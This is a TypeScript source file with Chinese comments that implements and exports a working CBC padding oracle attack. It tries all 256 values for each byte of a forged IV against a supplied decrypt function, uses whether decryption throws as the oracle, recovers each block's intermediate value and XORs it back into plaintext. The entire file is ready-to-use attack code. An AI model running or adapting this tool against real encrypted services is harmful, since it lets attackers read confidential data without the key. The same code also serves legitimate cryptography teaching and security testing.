/**
 * @file index.ts
 * @description CBC 填充提示攻击：只靠解密是否抛错，逐字节恢复中间值再还原明文。
 */

import { blockString, skipLine, trimPadding, xorBuffer } from './utils.js';

export { createCrypto } from './crypto.js';
export { blockString, skipLine, trimPadding, xorBuffer } from './utils.js';

export const setting = { debug: false };

const CBC_BLOCK_SIZE = 16;

type OracleStep = {
  thisTestIV: Buffer;
  nextBaseIV: Buffer;
  intermedia: Buffer;
};

export type DecryptFn = (ciphertextHex: string) => void;

/**
 * 构造长度为 byteSize、最后 n 个字节为 n 的填充块。
 * `lessOneByte` 时少写 1 个填充字节，给下一轮试 IV 打底。
 */
export function getPaddingBuf(byteSize: number, n: number, lessOneByte = false): Buffer {
  const loop = lessOneByte && n > 0 ? n - 1 : n;
  const buffer = Buffer.alloc(byteSize);
  for (let i = 0; i < loop; i++) {
    buffer.writeUInt8(n, byteSize - i - 1);
  }
  return buffer;
}

/**
 * 生成试探 IV：可叠已有尾巴，并在 testPos 写入 testNum。
 */
export function getTestInitializationVector(args: {
  byteSize: number;
  baseIV?: Buffer;
  testNum: number;
  testPos: number;
}): Buffer {
  const { byteSize, baseIV, testNum, testPos } = args;
  const buffer = Buffer.alloc(byteSize);
  if (baseIV) {
    const offset = byteSize - Buffer.byteLength(baseIV);
    buffer.write(baseIV.toString('hex'), offset, Buffer.byteLength(baseIV), 'hex');
  }
  buffer.writeUInt8(testNum, byteSize + testPos);
  return buffer;
}

/**
 * 对单个密文块撞 oracle，恢复该块中间值。
 * 第一轮可能命中多条合法填充路径，后续轮会把走不通的栈丢掉。
 */
export function crackCipherBlock(cipherBlock: string, decrypt: DecryptFn): Buffer {
  const blockSize = Buffer.byteLength(cipherBlock, 'hex');
  const stacks: OracleStep[][] = [];
  if (setting.debug) {
    skipLine(true);
    console.log(`开始破译${cipherBlock}的中间值`);
  }

  for (let n = 0; n < blockSize; n++) {
    const position = n + 1;
    if (position === 1) {
      for (let i = 0; i < 256; i++) {
        const thisTestIV = getTestInitializationVector({
          byteSize: blockSize,
          testNum: i,
          testPos: -position,
        });
        try {
          decrypt(thisTestIV.toString('hex') + cipherBlock);
          const paddingBuf = getPaddingBuf(blockSize, position);
          const intermediateBlock = xorBuffer(thisTestIV, paddingBuf);
          const nextPaddingBufLessOneByte = getPaddingBuf(blockSize, position + 1, true);
          stacks.push([
            {
              thisTestIV,
              nextBaseIV: xorBuffer(intermediateBlock, nextPaddingBufLessOneByte),
              intermedia: intermediateBlock,
            },
          ]);
        } catch {
          // 填充不合法，换下一个试探字节
        }
      }
    } else {
      for (const stack of stacks) {
        const prev = stack[stack.length - 1];
        if (!prev) continue;
        for (let i = 0; i < 256; i++) {
          const thisTestIV = getTestInitializationVector({
            byteSize: blockSize,
            testNum: i,
            testPos: -position,
            baseIV: prev.nextBaseIV,
          });
          try {
            decrypt(thisTestIV.toString('hex') + cipherBlock);
            const intermedia = xorBuffer(thisTestIV, getPaddingBuf(blockSize, position));
            const nextPaddingBufLessOneByte = getPaddingBuf(blockSize, position + 1, true);
            stack.push({
              thisTestIV,
              nextBaseIV: xorBuffer(intermedia, nextPaddingBufLessOneByte),
              intermedia,
            });
            break;
          } catch {
            // 填充不合法
          }
        }
      }
    }
  }

  const successStack = stacks.find((stack) => stack.length === blockSize);
  if (!successStack) {
    throw new Error(`crackCipherBlock: no valid oracle path found for block ${cipherBlock}`);
  }
  const last = successStack[successStack.length - 1];
  if (!last) {
    throw new Error(`crackCipherBlock: empty success stack for block ${cipherBlock}`);
  }
  const intermedia = last.intermedia;

  if (setting.debug) {
    console.log(successStack);
    console.log(`破译出的中间值: ${intermedia.toString('hex')}`);
  }

  return intermedia;
}

/**
 * 破译密文：`encryptedHex` 为 IV+密文（hex），`decrypt` 失败即视为填充错误。
 */
export function paddingOracleAttack(encryptedHex: string, decrypt: DecryptFn): string {
  // TODO: 块长不应写死
  const cipherBlocks = blockString(encryptedHex, CBC_BLOCK_SIZE * 2);
  if (setting.debug) {
    console.log('初始化向量');
    console.log(cipherBlocks[0]);
    console.log('密文分组');
    console.log(cipherBlocks.slice(1));
  }

  let decrypted = '';
  for (let i = 0; i < cipherBlocks.length - 1; i++) {
    const currentBlock = cipherBlocks[i + 1];
    const prevBlock = cipherBlocks[i];
    if (!currentBlock || !prevBlock) {
      throw new Error('paddingOracleAttack: incomplete cipher blocks');
    }
    const intermediateBlock = crackCipherBlock(currentBlock, decrypt);
    const plaintextBlock = xorBuffer(intermediateBlock, Buffer.from(prevBlock, 'hex')).toString(
      'hex',
    );
    decrypted += plaintextBlock;
  }
  return trimPadding(decrypted);
}
